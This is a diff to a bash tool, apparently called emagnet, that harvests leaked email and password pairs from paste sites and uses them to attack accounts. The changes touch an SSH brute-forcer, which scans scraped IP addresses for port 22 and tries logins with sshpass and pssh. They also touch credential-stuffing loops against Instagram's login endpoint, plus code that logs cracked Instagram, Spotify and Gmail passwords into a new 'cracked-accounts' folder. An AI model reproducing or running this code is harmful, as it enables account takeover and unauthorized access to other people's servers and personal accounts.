@@ -121,7 +121,7 @@ emagnet_requirements_android(){ for android_tools in curl wget; do hash "${andro
 emagnet_requirements(){ for cmd in wget curl; do hash $cmd; if [[ "$?" -gt 0 ]]; then echo "$cmd is required to be installed, exiting."; exit 1;fi;done;}
 emagnet_optional(){ sleep 0;}
 emagnet_blocked(){ if ! [[ -s "$HOME/.config/emagnet/tmp/.emagnet" ]]; then curl -h "$HEADER"-Ls "$PASTEBIN" -H "$USERAGENT" > $HOME/.config/emagnet/tmp/.emagnet;fi;} # 2FIX - Do we need this?
-emagnet_paths(){ PATHS="${EMAGNETHOME} ${EMAGNETDB} ${EMAGNETPW} ${EMAGNETTEMP} ${EMAGNETCRAP} ${EMAGNETALL} ${EMAGNETARCHIVE} ${EMAGNETLOGS}";for DIRS in ${PATHS}; do ! [[ -d "${DIRS}" ]] && mkdir -p "${DIRS}" &> /dev/null; done ;}
+emagnet_paths(){ PATHS="${EMAGNETHOME} ${EMAGNETCRACKED} ${EMAGNETDB} ${EMAGNETPW} ${EMAGNETTEMP} ${EMAGNETCRAP} ${EMAGNETALL} ${EMAGNETARCHIVE} ${EMAGNETLOGS}";for DIRS in ${PATHS}; do ! [[ -d "${DIRS}" ]] && mkdir -p "${DIRS}" &> /dev/null; done ;}
 CONF="$HOME/.config/emagnet/emagnet.conf"
 
 emagnet_mustbefilled() {
@@ -144,6 +144,7 @@ emagnet_mustbefilled() {
   if [[ -z "$EMAGNETDB"      ]];then sed -i "80d"  "$CONF";sed -i '80  i EMAGNETDB=$EMAGNETHOME\/email-files'                                                                                     "$CONF";fi
   if [[ -z "$EMAGNETBACKUP"  ]];then sed -i "81d"  "$CONF";sed -i '81  i EMAGNETBACKUP=$EMAGNET/backup'                                                                                           "$CONF";fi
   if [[ -z "$EMAGNETSYNTAX"  ]];then sed -i "82d"  "$CONF";sed -i '82  i EMAGNETSYNTAX=$EMAGNETHOME\/sorted-by-syntax'                                                                            "$CONF";fi
+  if [[ -z "$EMAGNETCRACKED" ]];then sed -i "83d"  "$CONF";sed -i '83  i EMAGNETCRACKED=$EMAGNET/cracked-accounts'                                                                                "$CONF";fi
   if [[ -z "$VERSION"        ]];then sed -i '91d'  "$CONF";sed -i '91  i VERSION=3.4'                                                                                                             "$CONF";fi
   if [[ -z "$THREADS"        ]];then sed -i '100d' "$CONF";sed -i "100 i THREADS=$(( NUMCPUS + 1 ))"                                                                                              "$CONF";fi
   if [[ -z "$IDLETIME"       ]];then sed -i '109d' "$CONF";sed -i "109 i IDLETIME=3600"                                                                                                           "$CONF";fi
@@ -248,11 +249,11 @@ if [[ "$?" = "0" ]]; then
     emagnet_banner
         for (( ; ; )); do
      	    wait_time=${IDLETIME}
-          temp_cnt=${wait_time}
-   		        while [[ "${temp_cnt}" -gt "0" ]]; do
-                  echo -e  "\rIP: [\e[1;31m$$WIP\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
-                  printf " seconds"
-                  sleep 1
+            temp_cnt=${wait_time}
+                  while [[ "${temp_cnt}" -gt "0" ]]; do
+                    echo -e  "\rIP: [\e[1;31m$$WIP\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
+                    printf " seconds"
+                    sleep 1
                   ((temp_cnt--))
   	          done
           printf "\n"
@@ -547,6 +548,8 @@ fi
 }
 
 emagnet_sshbruter() {
+hash pssh &> /dev/null
+( [[ $? -eq "0" ]] || echo -e "$basename$0: internal error -- pssh is required to be installed"; exit 1 )
 emagnet_conf
 if [[ -z "$SSHPASS" ]]; then
    echo -e "You must set a password to use during the attack"
@@ -561,21 +564,21 @@ if [[ -z "$SSHPASS" ]]; then
      fi
 fi
 
-# Skip all 192.168.* ip addresses, 11 ip addresses and all that begins on 1-9
-#SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*"
+# SKIPLIST - EDIT THIS IF YOU WANT TO SKIP MORE IP's
+SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*"
 grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
 |awk -F':' '{print $2}' \
 |sort \
 |awk -F, '!seen[$1]++' > "$SSHPORTSCAN"
 
    if [[ $(cat $SSHPORTSCAN|wc -l) -lt "1" ]]; then
-        echo -e "                      - IPv4 Addresses Found \r             [\e[1;31m00\e[0m] "
+        echo -e "                       - IPv4 Addresses Found \r             [\e[1;31m00\e[0m] "
         sleep 2
         else
-        echo -e "                      - IPv4 Addresses Found \r             [\e[1;32m$(cat $SSHPORTSCAN|wc -l)\e[0m] "
+        echo -e "                       - IPv4 Addresses Found \r             [\e[1;32m$(cat $SSHPORTSCAN|wc -l)\e[0m] "
         sleep 2
         xargs -i -P $THREADS timeout 0.5 nc -zvn {} 22 < $SSHPORTSCAN 2>&1|awk '{print $3} /succeeded/ '|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $SSHTARGETS
-        echo -e "                      - Has Port $SSHPORT Open\r             [\e[1;32m$(cat $SSHPORTSCAN|wc -l)\e[0m] "
+        echo -e "                       - Has Port $SSHPORT Open\r             [\e[1;32m$(cat $SSHPORTSCAN|wc -l)\e[0m] "
         printf "\n%64s\n" | tr ' ' '='
         printf "\n%15s";printf "BRUTE FORCING \e[1;34mSSH\e[0m TARGETS\e[0m\n\n"
         sleep 2
@@ -590,8 +593,7 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
         # do_pssh(hosts, cmdline, opts)
         # File "/usr/bin/pssh", line 89, in do_pssh
         # statuses = manager.run()
-
-#     while read sshtargets; do
+#       while read sshtargets; do
          sshpass -p "$SSHPASS" pssh  -O "StrictHostKeyChecking=no" -I -A -h $SSHTARGETS -i "uptime" < $SSHTARGETS |grep --color -i 'success\|failure' 
 #		if [[ $? -eq "0" ]]; then
 #		    	echo -e "[\e[1;32m>>\e[0m] - Cracked $sshtargets: $SSHUSER:$SSHPASS"
@@ -611,31 +613,25 @@ fi
 }
 
 emagnet_instagrambruter() {
-URL="https://www.instagram.com/accounts/login/ajax/?hl=en"
-xCFSRTOKEN="$(< /dev/urandom tr -dc A-Za-z0-9 | head -c${1:-32};echo)"
-
-    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
+     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
     |awk '{print $1}' \
     |cut -d':' -f2,3 \
     |cut -d'|' -f1 \
     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
-
-
-
-URL="https://www.instagram.com/accounts/login/ajax/?hl=en"
-while read line; do
-USERNAME="$(echo $line|cut -d: -f1)"
-PASSWPRD="$(echo $line|cut -d: -f2)"
+URL="https://www.instagram.com/accounts/login/ajax/?hl=jp"
+while read instagramlogin; do
+INSTAGRAM_USER="$(echo $instagramlogin|cut -d':' -f1,2|sed 's/:/\&password\=/g')"
+INSTAGRAM_PASS="$(echo $instagramlogin|cut -d':' -f2)"
 TOKEN="$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c33)"
-curl -s $URL --data "username=$USERNAME&password=$PASSWORD" -H "x-csrftoken: $TOKEN"|awk '{print $4}'|grep -q true
-if [[ "$?" -ne "1" ]]; then
-         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${USERNAME}:${PASSWORD}"
-         echo -e "================================================================"             >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
-         echo -e "[+] Login Details For INSTAGRAM - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"        >>    "$EMAGNETLOGS/cracked-instasgram-passwords.txt"
-         echo -e "[+]------------------------------------------------------------"              >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
-         echo -e "[+] Username: ${INSTAGRAM_USER}"                                              >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
-         echo -e "[+] Password: ${INSTAGRAM_PASS}"                                              >>    "$EMAGNETLOGS/cracked-instsagram-passwords.txt"
-         echo -e "================================================================\n\n"         >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
+curl -s $URL --data "username=$USERNAME&password=$PASSWORD" -H "x-csrftoken: $TOKEN"|awk '{print $4}'|grep -q 'true'
+if [[ $? -eq "0" ]]; then
+         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"
+         echo -e "================================================================"             >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
+         echo -e "[+] Login Details For INSTAGRAM - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"        >>    "$EMAGNETCRACKED/cracked-instasgram-passwords.txt"
+         echo -e "[+]------------------------------------------------------------"              >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
+         echo -e "[+] Username: ${INSTAGRAM_USER}"                                              >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
+         echo -e "[+] Password: ${INSTAGRAM_PASS}"                                              >>    "$EMAGNETCRACKED/cracked-instsagram-passwords.txt"
+         echo -e "================================================================\n\n"         >>    "$EMAGNETCRACKED/cracked-instagram-passwords.txt"
          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"    >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
          echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"      >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
          SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-instagram-cracked|grep -i 'Cracked'|wc -l)"
@@ -680,12 +676,12 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
                      |cut -d'|' -f1 \
                      |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
               	        echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
-            	        echo -e "================================================================"      >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
-             	        echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"   >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
-              	        echo -e "[+]------------------------------------------------------------"       >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
-             	        echo -e "[+] Username: ${SPOTIFY_USER}"                                         >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
-                      	echo -e "[+] Password: ${SPOTIFY_PASS}"                                         >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
-             	        echo -e "================================================================\n\n"  >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
+            	        echo -e "================================================================"      >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+             	        echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"   >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+              	        echo -e "[+]------------------------------------------------------------"       >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+             	        echo -e "[+] Username: ${SPOTIFY_USER}"                                         >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+                      	echo -e "[+] Password: ${SPOTIFY_PASS}"                                         >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+             	        echo -e "================================================================\n\n"  >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
                	        echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
                        	echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"   >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
                         SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-cracked|grep 'Cracked Password'|wc -l)" 
@@ -719,12 +715,12 @@ password="$(echo $line | cut -d: -f2)"
       if [[ -n "$attack" ]]; then
          echo -e "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
          read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
-         echo -e "================================================================"     >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
-         echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
-         echo -e "[+]------------------------------------------------------------"      >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
-         echo -e "[+] Username: $mail"                                                  >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
-         echo -e "[+] Password: $password"                                              >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
-         echo -e "================================================================\n\n" >>    "$EMAGNETLOGS/cracked-gmail-passwords.txt"
+         echo -e "================================================================"     >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
+         echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
+         echo -e "[+]------------------------------------------------------------"      >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
+         echo -e "[+] Username: $mail"                                                  >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
+         echo -e "[+] Password: $password"                                              >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
+         echo -e "================================================================\n\n" >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
       fi
 done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
     	rm "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt" &> /dev/null
@@ -878,7 +874,7 @@ pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EM
                         fi
                             echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m] "
                             echo -e "                       - Passwords Found \r             [\e[1;32m$pt\e[0m] "
-                            echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m] \n"
+                            echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m] "
 
                             sleep 2
                              if [[ "$GBRUTEFORCE" = "true" ]]; then
